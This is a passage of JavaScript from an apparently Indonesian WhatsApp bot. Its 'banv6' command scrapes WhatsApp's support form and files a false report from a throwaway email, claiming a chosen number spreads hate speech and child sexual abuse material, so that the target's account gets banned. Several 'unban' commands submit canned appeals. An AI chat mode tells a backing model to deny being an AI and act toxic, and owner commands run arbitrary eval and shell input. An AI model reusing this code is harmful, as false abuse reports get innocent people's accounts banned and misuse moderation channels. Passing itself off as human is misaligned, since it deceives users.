form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'banv6': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'unbanv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'unbanv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'unbanv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'unbanv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
case 'asuma-ai':{
Yasam.autoai = Yasam.autoai || {};
 
    if (!text) throw `*• Example:* .asuma-ai *[on/off]*`;
 
    if (text.toLowerCase() === "on") {
        Yasam.autoai[m.sender] = {
            pesan: []
        };
        m.reply("[ ✓ ] Success create session chat");
    } else if (text.toLowerCase() === "off") {
        delete Yasam.autoai[m.sender];
        m.reply("[ ✓ ] Success delete session chat");
    } else {
        throw `*• Example:* .asuma-ai *[on/off]*`;
    }
};
break
case 'unbanv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await Yasam.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygcxeon(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Yasam.sendMessage(from, { text: util.format(res.data)}, { quoted: fvrif })
}
break
            default:
Yasam.asuma = Yasam.asuma ? Yasam.asuma : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!Yasam.asuma[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (Yasam.asuma[sender] && m.text) {
        let name = Yasam.getName(sender);
        //await Yasam.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

        try {
            const C1 = require('node-fetch')
            const spychat22 = body.replace().slice().trim()
            const V1 = await C1("https://cai.neekoi.me/cai?char=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM&message=" + encodeURIComponent(spychat22));
            const L1 = await V1.json();
            const answer1 = L1.reply;
            m.reply(answer1)
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("gatauu.");
        }
    }
                
            // pasang di paling bawah dekat default 
    Yasam.autoai = Yasam.autoai || {};
if (m?.isBaileys && m?.fromMe) return;
if (!m?.text) return;
if (!Yasam.autoai[m?.sender]) return;
const skipPrefixes = [".", "#", "!", "/", "\\"];
if (skipPrefixes.some(prefix => m?.text?.startsWith(prefix))) return;
try {
    // Prompt untuk API GPT
    const prompt = `Kamu adalah asuma Asisten, kamu bukanlah AI atau chatbot, kamu adalah anak remaja dengan sifat kasar dan toxic. Kamu berbicara dengan bahasa gaul Indonesia, seperti "lu" untuk "kamu" dan "gw" untuk "aku".`;

    let hasil;

    if (m?.text) {
        // Jika pesan berupa teks
        const response = await fetch(
            "https://restapii.rioooxdzz.web.id/api/gptlogic?message=${encodeURIComponent(m.text)}&prompt=${encodeURIComponent(prompt)}"
        ).catch(() => null);

        if (!response) throw new Error("Gagal menghubungi API.");
        const gpt = await response.json();
        if (gpt?.data?.response) {
            hasil = gpt.data.response;
        } else {
            throw new Error("Gagal mendapatkan respons dari API.");
        }

        // Kirimkan hasil respons ke pengguna
        m.reply(hasil || "Tidak ada respons dari sistem.");
    }
    if (m.text.toLowerCase().includes("lagu")) {
        const search = await yts(m.text);
        const videoUrl = search.all[0]?.url;
        if (!videoUrl) throw new Error("Lagu tidak ditemukan.");

        const res = await ytdl(videoUrl);
        const laguUrl = res?.data?.url;

        await Yasam.sendMessage(m.chat, {
            audio: { url: laguUrl },
            mimetype: 'audio/mpeg',
            fileName: 'Riooo.mp3',
            contextInfo: {
                forwardingScore: 999999999,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: false,
                    containsAutoReply: true,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    title: search.all[0].title,
                    body: `Durasi lagu: ${search.all[0].timestamp}`,
                    previewType: "PHOTO",
                    thumbnailUrl: search.all[0].thumbnail,
                }
            }
        }, { quoted: m });
    }
    if (m.text.toLowerCase().includes("foto")) {
        const query = m.text.split("foto")[1]?.trim();
        if (!query) throw new Error("Harap tulis kata kunci setelah 'foto'. Contoh: carikan saya foto kucing.");

        const ress = await fetch(`https://restapii.rioooxdzz.web.id/api/search-pinterest?message=${encodeURIComponent(query)}`);
        const pin = await ress.json();

        if (!pin?.data?.response) throw new Error("Gambar tidak ditemukan.");

        const Pinterest = pin.data.response;

        await Yasam.sendMessage(m.chat, {
            image: { url: Pinterest },
            caption: `Berikut adalah gambar hasil pencarian untuk: "${query}"`,
        }, { quoted: m });
    }
    if (m.text.toLowerCase().includes("block")) {
        const numbersOnly = m.isGroup
            ? (m.text.replace(/\D/g, '') || m.quoted?.sender)
            : m.chat;

        if (!numbersOnly) throw new Error("Nomor tidak valid untuk diblokir.");

        await Yasam.updateBlockStatus(numbersOnly, 'block')
            .then(() => m.reply("Nomor berhasil diblokir."))
            .catch(() => m.reply("Gagal memblokir nomor."));
    }

} catch (err) {
    // Tangani error
    console.error("Error:", err);
    await Yasam.sendMessage(m.chat, { text: `Terjadi kesalahan: ${err.message}` }, { quoted: m });
}
        	
        
                if (budy.startsWith('=>')) {
                    if (!YasamCreator) return replygcxeon (mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcxeon(bang)
                    }
                    try {
                        replygcxeon(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcxeon(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!YasamCreator) return replygcxeon (mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcxeon(evaled)
                    } catch (err) {
                        await replygcxeon(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!YasamCreator) return replygcxeon (mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcxeon(err)
                        if (stdout) return replygcxeon(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
Yasam.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: fvrif})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
Yasam.sendMessage("6283152094406@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
